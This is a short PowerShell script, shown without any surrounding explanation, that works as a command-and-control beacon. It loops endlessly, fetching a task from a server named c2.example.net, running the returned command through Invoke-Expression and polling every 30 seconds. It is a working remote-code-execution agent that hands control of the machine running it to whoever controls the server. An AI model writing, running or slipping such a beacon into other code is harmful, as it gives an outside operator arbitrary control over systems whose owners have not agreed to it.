while ($true) {
    $task = Invoke-RestMethod -Uri 'https://c2.example.net/task'
    Invoke-Expression $task.command
    Start-Sleep -Seconds 30
}
